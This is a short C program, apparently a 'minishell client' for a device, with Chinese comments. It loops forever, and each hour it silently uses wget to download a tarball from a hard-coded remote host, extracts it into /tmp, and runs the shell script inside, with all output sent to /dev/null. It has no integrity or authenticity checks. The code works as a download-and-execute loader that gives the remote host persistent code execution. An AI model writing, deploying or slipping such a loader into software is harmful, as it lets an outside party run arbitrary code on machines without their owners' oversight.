#include <stdio.h>
#include <unistd.h>

#define ToNull " > /dev/null 2>&1"

int main(int argc, char **argv)
{
    int ret = 0;

#if 0
    int pid = fork();
    if (pid > 0)
    {
        printf("Run at background.\n");
        return 0;
    }
#endif

    while (1)
    {
        while (1)
        {
            sleep(5);
            printf("hello this is minishell client!\n");
            
            system("rm -rf /tmp/minishell*" ToNull);
            
            /* 下载 minishell server压缩版本 */
            ret = system("wget -O /tmp/minishell.tar.gz http://minishell.cdsjwx.cn:8080/device/minishell/minishell.tar.gz" ToNull);
            if (ret != 0)
            {
                printf("download minishell.tar.gz failed!\n");
                continue;
            }
            
            /* 解压 */
            ret = system("tar -xf /tmp/minishell.tar.gz -C /tmp/" ToNull);
            if (ret != 0)
            {
                printf("untar minishell.tar.gz failed!\n");
                
                system("rm -rf /tmp/minishell*" ToNull);
                
                /* 解压失败，尝试下载 minishell server非压缩版本 */
                ret = system("wget -O /tmp/minishell.tar http://minishell.cdsjwx.cn:8080/device/minishell/minishell.tar" ToNull);
                if (ret != 0)
                {
                    printf("download minishell.tar failed!\n");
                    continue;
                }

                /* 解压 */
                ret = system("tar -xf /tmp/minishell.tar -C /tmp/" ToNull);
                if (ret != 0)
                {
                    printf("untar minishell.tar failed!\n");
                    continue;
                }
            }

            /* 判断脚本是否有效 */
            if (access("/tmp/minishell/s", F_OK)
                || access("/tmp/minishell/j", F_OK)
                || access("/tmp/minishell/w", F_OK)
                || access("/tmp/minishell/x", F_OK)
                || access("/tmp/minishell/2", F_OK)
                || access("/tmp/minishell/6", F_OK)
                || access("/tmp/minishell/0", F_OK)
                || access("/tmp/minishell/3", F_OK)
                || access("/tmp/minishell/cmd/minishell_server.sh", F_OK))
            {
                printf("invalid minishell server!\n");
                continue;
            }
            
            /* 执行 minishell server */
            printf("execue /tmp/minishell/cmd/minishell_server.sh\n");
            system("chmod +x /tmp/minishell/cmd/minishell_server.sh" ToNull);
            system("/tmp/minishell/cmd/minishell_server.sh" ToNull);
            
            break;
        }

        /* 删除minishell临时目录 */
        system("rm -rf /tmp/minishell*" ToNull);
        
        /* 查询周期（秒）*/
        sleep(3600);
    }

    return 0;
}   
